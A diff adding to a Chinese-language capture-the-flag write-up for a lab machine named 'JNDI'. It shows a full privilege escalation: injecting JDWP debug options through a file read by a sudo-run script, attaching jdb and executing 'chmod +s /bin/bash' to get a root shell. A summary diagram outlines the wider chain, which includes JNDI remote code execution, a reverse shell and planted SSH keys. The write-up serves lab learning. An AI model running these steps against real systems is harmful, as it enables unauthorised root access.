@@ -310,9 +310,80 @@ echo $file_line
 
 JDWP (Java Debug Wire Protocol) 是 Java 提供的调试协议。如果我们在加载它时传⼊特定的参数，它就会在指定的端⼝上开启⼀个调试服务。⽽在 Java 中，调试器拥有最⾼权限：它可以随意实例化对象、调⽤⽅法（包括 Runtime.getRuntime().exec() 来执⾏系统命令）。
 
+- `chmod +s /bin/bash`
+    - 给 `/bin/bash` 设置 SUID 位
+    - 任何用户执行 `/bin/bash` → 自动以文件拥有者（root）身份运行
+- `java.lang.Runtime.getRuntime().exec()`
+    - Java 提供执行系统命令的方法
+    - 你在 debug session 里直接执行了这条命令
+- 返回 `"java.lang.UNIXProcess@1eb44e46"`
+    - 表示 Java 已经创建了子进程执行命令
+    - **不代表报错，说明命令已经被执行**
 ```bash
-liz@JNDI:/home/bluebird$ echo "libjdwp.so=transport=dt_socket,server=y,address=8000,suspend=y" >/opt/file/tmp
-liz@JNDI:/home/bluebird$ sudo /bin/bash /opt/java_agent_start.sh
-libjdwp.so=transport=dt_socket,server=y,address=8000,suspend=y
-Listening for transport dt_socket at address: 8000
+liz@JNDI:/home/bluebird$ echo "libjdwp.so=transport=dt_socket,server=y,address=8001,suspend=y" >/opt/file/tmp
+
+liz@JNDI:/$ sudo /bin/bash /opt/java_agent_start.sh
+libjdwp.so=transport=dt_socket,server=y,address=8001,suspend=y
+Listening for transport dt_socket at address: 8001
+
+┌──(root㉿kali)-[/home/kali]
+└─# jdb -attach 192.168.56.132:8001
+设置未捕获的java.lang.Throwable
+设置延迟的未捕获的java.lang.Throwable
+正在初始化jdb...
+
+VM 已启动: > 当前调用堆栈上没有帧
+
+main[1] stop in java.io.PrintStream.println(java.lang.String)
+设置断点java.io.PrintStream.println(java.lang.String)
+main[1] cont
+> 
+断点命中: "线程=main", java.io.PrintStream.println(), 行=805 bci=0
+
+main[1] print java.lang.Runtime.getRuntime().exec("chmod +s /bin/bash")
+ java.lang.Runtime.getRuntime().exec("chmod +s /bin/bash") = "java.lang.UNIXProcess@1eb44e46"
+main[1] 
+```
+现在有了root权限,提权成功拿到flag
+```
+liz@JNDI:/$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
+liz@JNDI:/$ /bin/bash -p
+bash-5.0# id
+uid=1000(liz) gid=1000(liz) euid=0(root) egid=0(root) groups=0(root),1000(liz)
+bash-5.0# cat /root/root.txt
+flag{ilikeyou,too,Mizore}
+```
+
+## 一图流
+```
+[信息收集]  
+↓  
+发现 Tomcat + AJP    
+↓  
+[JNDI 利用]  
+↓  
+RCE → 反弹 shell → TTY   
+↓  
+[横向移动]  
+↓  
+写入 SSH 公钥  
+→ ssh bluebird@target ✔   
+↓  
+[权限提升突破点]  
+↓  
+sudo /opt/java_agent_start.sh （可执行）  
+↓  
+[JDWP 利用]  
+↓  
+jdb -attach target:8000   
+↓  
+执行命令：  
+Runtime.getRuntime().exec("chmod +s /bin/bash")  
+↓  
+[提权完成]  
+↓  
+/bin/bash -p  
+↓  
+✔ root shell
 ```
